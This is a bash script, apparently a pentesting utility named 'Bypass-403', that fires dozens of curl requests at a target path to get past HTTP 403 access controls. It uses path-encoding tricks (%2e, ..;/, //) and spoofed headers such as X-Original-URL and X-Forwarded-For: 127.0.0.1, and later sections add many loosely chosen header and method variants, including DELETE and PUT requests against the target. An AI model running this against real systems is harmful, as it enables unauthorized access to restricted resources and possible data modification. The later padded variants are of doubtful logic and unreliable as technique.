#! /bin/bash
figlet Bypass-403
echo "                                               By Iam_J0ker"
echo "./bypass-403.sh https://example.com path"
echo " "
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2
echo "  --> ${1}/${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%2e/$2
echo "  --> ${1}/%2e/${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/.
echo "  --> ${1}/${2}/."
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1//$2//
echo "  --> ${1}//${2}//"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/./$2/./
echo "  --> ${1}/./${2}/./"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: $2" $1/$2
echo "  --> ${1}/${2} -H X-Original-URL: ${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Custom-IP-Authorization: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: http://127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-For: http://127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 127.0.0.1:80" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-For: 127.0.0.1:80"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-rewrite-url: $2" $1
echo "  --> ${1} -H X-rewrite-url: ${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%20
echo "  --> ${1}/${2}%20"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%09
echo "  --> ${1}/${2}%09"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2?
echo "  --> ${1}/${2}?"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.html
echo "  --> ${1}/${2}.html"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/?anything
echo "  --> ${1}/${2}/?anything"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2#
echo "  --> ${1}/${2}#"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Content-Length:0" -X POST $1/$2
echo "  --> ${1}/${2} -H Content-Length:0 -X POST"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/*
echo "  --> ${1}/${2}/*"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.php
echo "  --> ${1}/${2}.php"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.json
echo "  --> ${1}/${2}.json"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2
echo "  --> ${1}/${2}  -X TRACE"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Host: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Host: 127.0.0.1"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2..;/"
echo "  --> ${1}/${2}..;/"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" " $1/$2;/"
echo "  --> ${1}/${2};/"
#updated
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2
echo "  --> ${1}/${2} -X TRACE"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Authorization: Bearer $2" $1
echo "  --> ${1} -H Authorization: Bearer ${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Accept-Language: en-US,en;q=0.8" $1
echo "  --> ${1} -H Accept-Language: en-US,en;q=0.8"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Referer: $2" $1
echo "  --> ${1} -H Referer: ${2}"
curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" "$1/$2.xml"
echo "  --> ${1}/${2}.xml"
curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" "$1/$2.html"
echo "  --> ${1}/${2}.html"
curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" "$1/$2.txt"
echo "  --> ${1}/${2}.txt"
curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" "$1/$2.css"
echo "  --> ${1}/${2}.css"
curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" -H "Accept: application/vnd.api+json" "$1/$2"
echo "  --> ${1}/${2} -H Accept: application/vnd.api+json"
curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" -H "Authorization: Bearer $2" "$1"
echo "  --> ${1} -H Authorization: Bearer ${2}"
curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" -H "Referer: https://www.example.com" "$1/$2"
echo "  --> ${1}/${2} -H Referer: https://www.example.com"
curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" -H "X-Requested-With: XMLHttpRequest" "$1/$2"
echo "  --> ${1}/${2} -H X-Requested-With: XMLHttpRequest"
# Example 1: send a POST request with a custom Content-Type header and a JSON payload
curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" -H "Content-Type: application/json" -d '{"key1":"value1","key2":"value2"}' -X POST "$1/$2"
echo "  --> ${1}/${2} -H Content-Type: application/json -d '{\"key1\":\"value1\",\"key2\":\"value2\"}' -X POST"

# Example 2: send a GET request with a custom Accept-Encoding header and set a custom cookie
curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" -H "Accept-Encoding: gzip,deflate" -b "cookie_name=cookie_value" "$1/$2"
echo "  --> ${1}/${2} -H Accept-Encoding: gzip,deflate -b cookie_name=cookie_value"

# Example 3: send a PUT request with a custom If-Match header and a JSON payload
curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" -H "If-Match: \"1234567890\"" -H "Content-Type: application/json" -d '{"key1":"value1","key2":"value2"}' -X PUT "$1/$2"
echo "  --> ${1}/${2} -H If-Match: \"1234567890\" -H Content-Type: application/json -d '{\"key1\":\"value1\",\"key2\":\"value2\"}' -X PUT"

# Example 4: send a DELETE request with a custom If-Unmodified-Since header
curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" -H "If-Unmodified-Since: Tue, 11 Jan 2022 12:34:56 GMT" -X DELETE "$1/$2"
echo "  --> ${1}/${2} -H If-Unmodified-Since: Tue, 11 Jan 2022 12:34:56 GMT -X DELETE"

# Example 5: send a GET request with a custom Accept-Language header and set a custom referer
curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" -H "Accept-Language: en-US,en;q=0.9" -e "https://www.example.com" "$1/$2"
echo "  --> ${1}/${2} -H Accept-Language: en-US,en;q=0.9 -e https://www.example.com"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Origin: https://example.com" -X OPTIONS $1
echo "  --> ${1} -H Origin: https://example.com -X OPTIONS"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "If-Modified-Since: Wed, 13 Feb 2023 12:00:00 GMT" $1
echo "  --> ${1} -H If-Modified-Since: Wed, 13 Feb 2023 12:00:00 GMT"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Authorization: Basic $(echo -n 'username:password' | base64)" -X PUT $1
echo "  --> ${1} -H Authorization: Basic $(echo -n 'username:password' | base64) -X PUT"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36" -X GET $1/$2
echo " --> ${1}/${2} --user-agent Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36 -X GET"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Referer: $3" -X POST $1/$2
echo " --> ${1}/${2} -H Referer: ${3} -X POST"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Origin: $3" -X PUT $1/$2
echo " --> ${1}/${2} -H Origin: ${3} -X PUT"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Accept-Encoding: gzip, deflate" -X DELETE $1/$2
echo " --> ${1}/${2} -H Accept-Encoding: gzip, deflate -X DELETE"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Connection: keep-alive" -X HEAD $1/$2
echo " --> ${1}/${2} -H Connection: keep-alive -X HEAD"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Requested-With: XMLHttpRequest" -X PATCH $1/$2
echo " --> ${1}/${2} -H X-Requested-With: XMLHttpRequest -X PATCH"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "User-Agent: MyCURLClient/1.0" -X OPTIONS $1/$2
echo " --> ${1}/${2} -H User-Agent: MyCURLClient/1.0 -X OPTIONS"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Referer: $2" -X GET $1
echo " --> ${1} -H Referer: ${2} -X GET"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: $2" -X POST $1
echo " --> ${1} -H X-Forwarded-For: ${2} -X POST"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Accept-Encoding: gzip" -X PUT $1
echo " --> ${1} -H Accept-Encoding: gzip -X PUT"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Connection: close" -X DELETE $1
echo " --> ${1} -H Connection: close -X DELETE"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Expect:" -X HEAD $1
echo " --> ${1} -H Expect: -X HEAD"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "User-Agent: $2" -X GET $1
echo " --> ${1} -H User-Agent: ${2} -X GET"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Origin: $2" -X POST $1
echo " --> ${1} -H Origin: ${2} -X POST"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Accept-Language: $2" -X PUT $1
echo " --> ${1} -H Accept-Language: ${2} -X PUT"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Accept: $2" -X DELETE $1
echo " --> ${1} -H Accept: ${2} -X DELETE"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Range: $2" -X HEAD $1
echo " --> ${1} -H Range: ${2} -X HEAD"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Connection: $2" -X POST $1
echo " --> ${1} -H Connection: ${2} -X POST"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Upgrade-Insecure-Requests: $2" -X PUT $1
echo " --> ${1} -H Upgrade-Insecure-Requests: ${2} -X PUT"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: $2" -X DELETE $1
echo " --> ${1} -H X-Forwarded-For: ${2} -X DELETE"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Requested-With: $2" -X HEAD $1
echo " --> ${1} -H X-Requested-With: ${2} -X HEAD"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-HTTP-Method-Override: $2" -X POST $1
echo " --> ${1} -H X-HTTP-Method-Override: ${2} -X POST"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Accept-Encoding: $2" -X DELETE $1
echo " --> ${1} -H Accept-Encoding: ${2} -X DELETE"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Accept-Language: $2" -X HEAD $1
echo " --> ${1} -H Accept-Language: ${2} -X HEAD"

curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Origin: $2" -X GET $1
echo " --> ${1} -H Origin: ${2} -X GET"

















